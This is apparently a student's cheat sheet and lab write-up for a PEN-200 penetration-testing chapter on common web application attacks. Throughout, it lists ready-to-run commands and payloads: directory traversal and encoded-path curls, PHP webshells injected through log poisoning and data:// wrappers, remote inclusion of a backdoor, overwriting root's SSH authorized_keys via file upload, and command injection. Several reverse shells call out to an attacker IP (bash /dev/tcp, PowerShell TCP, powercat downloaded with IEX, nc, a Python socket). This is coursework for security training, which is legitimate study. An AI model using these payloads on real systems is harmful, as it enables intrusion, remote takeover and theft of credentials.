---
title: "Chapter 9: Common WebApp Attacks- Code"
author: "James Heringer"
course: "PEN-200"
date: 2025-09-26
tags: [Code,CURL,IDOR,DIR,XSS,Encoding,File Inclusion,IDOR,LFI,RFI,PHP,Command Injection]
description: "the code blocks and terminal commands presented in the chapter 9"
draft: false
layout: cheatsheet
---
# Chapter 9: Common WebApp Attacks- Code

## DIR traversal

### Linux Attack Path 
1. DIR traverse to list users in /etc/passwd
2. Check found users home directory for SSH private keys, ~/.ssh/id_rsa
3. Retrieve private keys, and use them to SSH to host
```shell
chmod 400 priv_key   # set perms SSH private key
ssh -i priv_key -p 2222  offsec@mountaindesserts.com     # Use SSH private key to connect
```

* DIR traversal attack, sent PROXY through BURP
```shell
# [Grafana exploit](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/) 
curl --path-as-is "http://192.168.232.193:3000/public/plugins/loki/../../../../../../../../../../../../../../users/install.txt" --proxy 127.0.0.1:8080 # burp proxy
curl --path-as-is "http://192.168.232.193:3000/public/plugins/loki/../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts" # windows test file
```

* You can search for CVEs using built-in ExploitDB exploits : `/usr/share/exploitdb/exploits`
```shell
searchsploit -t grafana   # search by title
searchsploit --cve 2021-43798 -p  # search by CVE and return path
searchsploit -m multiple/webapps/50581.py # copies Exploit to current path
searchsploit -x multiple/webapps/50581.py # Examine/open in pager


```
* [Grafana exploit](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/) 

### Windows
* Windows is slightly harder to execute DIR traversal.
* Try using both ../ and ..\ , as the WebServer might require one or the other, just Windows things
* try reading hosts file, which is global user readable, to identify if DIR traversal is possible 
```shell
../../../../windows/system32/drivers/etc/hosts # windows DIR traversal 
../../../../inetpub/wwwroot/web.config # windows DIR traversal
../../../../inetpub/logs/LogFiles/W3SVC1 # windows DIR traversal
```
## Encoding Special Characters 
* [W3 School URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.asp)
* ` ../ ` is often filtered on the WebApp or firewall
* We use URL/Percent encoding to replace the filtered ASCII CHARS with HEX.
* Format is `%` followed by 2 Hex characters, i.e. `%2F`
* `.` = `%2e` && `/` = `%2f`
```shell
 curl http://192.168.232.16/cgi-bin/../../../../../opt/passwords 
 # Doesn't work, Filtered on server, lets Replace . %2e
curl --path-as-is  http://192.168.232.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords  

OS{36afaf1a2db5c3c07b6a45593dc7b644} 
```
## LFI - Local File Inclusion
* Log Poisoning, modify data sent to logs so it has executable code, trigger with LFI
* Use DIR traversal to view log files
* if log files has something like UserAgent, we can use Burp to insert PHP code into our user agent
* this code could act as webshell, 
### Steps to execute via 9.2.1
1. DIR traversal with Curl to validate access.log has user agent that we can write php code to `curl --path-as-is http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`
2. Navigate to website, and find link with php, `index.php?page=admin.php` , send to Repeater in Burp
3. Burp Repater : Modify User-Agent on request, add `<?php echo system($_GET['cmd']); ?>`, SEND!!!
4. LFI vulnerability should be live
5. Use DIR traversal again, at LFI location, with our updated CMD, `../../../../../../../../../var/log/apache2/access.log&cmd=ps`
6. Can send many commands now : `../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-al` , URL encoding space as %20
7. Attempt RevShell with LFI : 
```shell
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1     # common bash reverse shell
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"   # since we have PHP, which uses SH, use this RevShell instead
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22   # same shell, but encoded with special characters
```
* *Source* : [PayLoadsAllTheThings Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

### LFI - Windows 
* On Windows, steps are the same, but logs are in different locations
* For example, target running XAMPP, the Apache logs can be found in `C:\xampp\apache\logs\`
* Same PHP code should work
* NOTE: above example was PHP. The same concepts apply for other code, such as JS. We could log poison and execute
---
## PHP Wrappers (filter && data)
### php://filter
* takes resource as argument
* used to read instead of execute 
* PHP is server side, try encoding output to see if it changes, 
* decode in terminal with Base64 command 
```shell
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php  # PHP Encode Base 64 
echo "PCFE...bD4K" | base64 -d  # DECODED Base64
echo "My encoded stuff" | base64 # Encode Base64
```
### data://
* Used to execute code
* Alternative to LFI when we can NOT poison local file
* When filtering is in place, attempt to encode the data wrapper and then send to server
* Doesn't work in Default PHP install. Requires `allow_url_include` to be enabled
```shell
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>" # no encoding
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" # base64 encoded

```

## Remote File Inclusion (RFI)
* Include files from remote system, over SMB or HTTP
* Like data://, doesn't work in Default PHP install. 
* Requires `allow_url_include` to be enabled
* Enumerate the same way as LFI or DIR Traversal
* Common scenarios: WebApp loads files, like library or app data, from remote systems
* Less common than LFI, as specific requirements must be in place
* user a webshell in RFI, `/usr/share/webshells/php/simple-backdoor.php`
```shell
python3 -m http.server 80 # start web server to host shell file

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.203/simple-backdoor.php&cmd=ls"  
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.203/phprevshell9.php"  

```
## File Upload Vulnerability
* 2 main types
    1. File we upload is executable by WebApp, i.e. .php file and PHP is used by WebApp
    2. File upload is combined with another VULN, like DIR traversal.
        * i.e. : Upload a SSH authorized key files with DIR Traversal to users ~/.ssh/ directory
* Can be combined with XSS or XXE - XML External Entity
    * XXE is when XML contains URI to external entity (https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
    ```xml
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>
    ``` 
 ```bash
 echo "this is a test" > test.txt
 ```
* Try using different extensions, i.e. .phps, or .php7
* Try changing case, .php = PHp or pHp
* [Base64 online encoder](https://www.base64encode.org/)
### WebShell Methodology
1. Identify framework and languages WebApp is using, to determine type of shell we need
2. Find way to upload, location needs to be accessible to us
3. Work around filters as neccessary, try uploading .txt and then renaming to target, .php. or whatever
4. Send commands to webshell

* PowerShell on Kali Machine to encoder the RevShell One-liner
    1. Create variable $text, used for storing RevShell as string
    2. Encode via Unicode class
    3. Use Convert function 

```powershell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.203",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText # Copy this output for use
exit
# When usin this CURL, notice the following 
# cmd=powershell -enc BASE64-STRING, cmd=powershell%20-enc%20BASE64-STRING
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAa
```
## Using Non-Executable Files
* Always try file uplaod twice, to see WebApp behavior. If the WebApp responds that file exists, you can use this to brute-force contents of server. 
* If instead, WebApp returns an error, this may disclose info about tech stack
* Try DIR traversal on file upload, to see if you we can write to another location
* Attempt to override root/.ssh/authorized_keys to gain ssh access

```bash
ssh-keygen
file_up # priv key is file_up : public key will be file_up.pub
cat file_up.pub > authorized_keys
# send with burp or CURL to server, then ssh
filename="../../../../../../../../root/.ssh/authorized_keys" # Burp syntax

 ssh -p 2222 -i fileup root@mountaindesserts.com  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" 
```
## OS Command Injection
* If WebApp allows commands, try adding or appending our commands to that
* Use semicolon `%3B`to attempt filter bypass
* try classic double Backticks, such as 
```bash
`command`
```
* URL encode the commands at https://www.w3schools.com/tags/ref_urlencode.asp
* once working command injection, find AVAILABLE  commands by testing using which
    * which command, i.e. `which nc` or `which bash` or `which python3`

### WINDOWS
```bash
# IP config test
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive 
# Detect if CMD or PowerShell, (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```
* Get a reverse shell with powercat
* base code, `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.167/powercat.ps1");powercat -c 192.168.45.167 -p 4444 -e powershell`
* Use w3schools to encode then try 
* copy powercat from `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
* Start python server and ncat listener
```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.167%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.167%20-p%204444%20-e%20powershell%20  http://192.168.50.189:8000/archive
```
### LINUX
* Linux Rev shell instead
* Basecode * revshell "nc -c" `nc -c sh 192.168.45.167 4444`
* ENCODED `nc%20-c%20sh%20192.168.45.167%204444`

```bash
curl -X POST --data 'Archive=git%3Bsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.167%2F4444%200%3E%261'  http://192.168.102.16:8000/archive

```



# Labs 
## 9.1 VM1-1
* IP 192.168.232.16 mountaindesserts.com
* /home/ariella/flag.txt
*Follow the steps in this section and leverage the LFI vulnerability in the web application (located at http://mountaindesserts.com/meteor/) to receive a reverse shell on WEB18 (VM #1). 
*Get the flag from the /home/ariella/flag.txt file. To display the contents of the file, check your sudo privileges with sudo -l and use them to read the flag.

* Validating DIR traversal can enumerate log file, to see what is writeable for LFI
```shell
curl --path-as-is http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`
```
* The DIR traversal was successful, validated access.log has User-Agent in log
* Attempting to add our php code user-agent and inject to the access.log 
    * This is done by navigating to website, and finding admin page with .php in the link, 
    * sending this page to burp repeater, and then modifying user-agent with php code -> SEND
* Now we Re-use our first DIR traversal command, but add the cmd back onto the end of it: `../../../../../../../../../var/log/apache2/access.log&cmd=whoami`
* start NC listener on KALI `nc -nvlp 4444`
* go for RevShell, using the encode bash shell, but with our IP `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.203%2F4444%200%3E%261%22`
* FLAG = OS{898286a23ae4568b53b729eaee1bbb24}
---

## 9.1 VM1-2
* Exploit the LFI vulnerability in the web application "Mountain Desserts" on WEB18 (VM #1) (located at http://mountaindesserts.com:8001/meteor/) to execute the PHP /opt/admin.bak.php file with Burp or curl.
* Enter the flag from the output. 
* Not really an LFI, but DIR traversal: `curl --path-as-is http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
* OS{27dd9eea97bc8d1eabe19176a0de80c3}

## 9.1 VM2 Windows
* IP : 192.168.232.193
* The "Mountain Desserts" web application now runs on VM #2 at http://192.168.50.193/meteor/ (The third octet of the IP address in the URL needs to be adjusted).
*  Use the LFI vulnerability in combination with Log Poisoning to execute the dir command. 
* Poison the access.log log in the XAMPP C:\xampp\apache\logs log directory .
* Find the flag in one of the files from the dir command output.

* Validated directory traversal : `curl --path-as-is http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../windows/system32/drivers/etc/hosts`
* Viewing poisonable items in log : `/xampp/apache/logs/access.log`
* Poisoned log with User-Agent PHP code view admin.php 
* DIR with CMD exec found file : `hopefullynobodyfindsthisfilebecauseitssupersecret.txt`
* Exec CMD : type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt

## 9.2.1 VM1 - 192.168.208.16
* Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the php://filter with base64 encoding
* to include the contents of the /var/www/html/backup.php file with Burp or curl.
* Copy the output, decode it, and find the flag.
    1. Started Burp, Navigated to URL, clicked on Admin on bottom of page
    2. Send this request to repeater, then modified request and added the PHP filter wrapper, along with DIR traversal
    3. Took Base64 output, and decoded on terminal, got flag : OS{4de1bc5741e4c840cff3128632feff3b}

```shell
http://192.168.208.16/meteor/index.php?page=admin.php# # 1
index.php?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/backup.php # 2
echo "PCF...D4K" | base64 -d  # 3 - decoded from Base64 with echo, got flag
```

* Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to 
* execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.
    1. Started Burp, Navigated to URL, clicked on Admin on bottom of page
    2. Sent to repeater, modified request for Data Wrapper, got uname -a kernel version
    3. Works without encoding and with encoding on this PHP server


```shell
# 
?page=data://text/plain,<?php%20echo%20system('ls');?> # no encoding
?page=data://text/plain,<?php%20echo%20system('uname%20-a');?> # no encoding
# echo -n '<?php echo system($_GET["cmd"]);?>' | base64
?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a  # with encoding
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a" --proxy 127.0.0.1:8080  # curl example
```
## 9.2.3 VM1 - 192.168.208.16
* Started python web server `python3 -m http.server 80`
* issued curl command to LFI the simple-backdoor.php script that is found in `/usr/share/webshells/php/simple-backdoor.php`
* `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.203/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"`
* Got flag from .ssh/authorized_keys
## 9.2.3 VM1-2 - 192.168.208.16
* Used pentestMonkey's php reverse shell grep -r monkey /usr/share/webshells
* edited file with my ip and port 4444
* started NC listener `nc -nvlp  4444`
* sent curl command with simple shell.php retrieval, got shell
* `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.203/phprevshell9.php"`
* `cat flag.txt`  OS{94beebffc9033b9eaaf8fa7bbe437fcd}

## 9.3 VM3 - 192.168.102.16
Capstone Lab: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.

* initial scan
* enumerate with Gobuster
gobuster dir -u http://192.168.102.16 -w /usr/share/wordlists/dirb/common.txt -t 40 -x .php,.txt,.html 

Visit VM #3's webserver to find three fields on the login page.
Test various inputs like && to identify the command injection vulnerability.
Assume the back-end uses a vulnerable function like eval() or popen(): popen(f'echo "test"')

[Command Injection list] (https://hackviser.com/tactics/pentesting/web/command-injection)
This one worked, in the 3rd, combined field login on http://192.168.102.16/login
```bash

a`uname`
# identify what binaries are available
a`which python3`
# revshell.scom python3 shortest
a`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.167",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`
# on revshell on KALIi
sudo su
```

## 9.3 VM4  192.168.102.192
nmap, then gobuster
ports 80 and 8000 were open
uploaded files on IIS on 8000.. but browsed executed on 80
Wappalyzer identifieid ASPNET in use. Uploaded ASPX from /usr/share/webshells/aspx
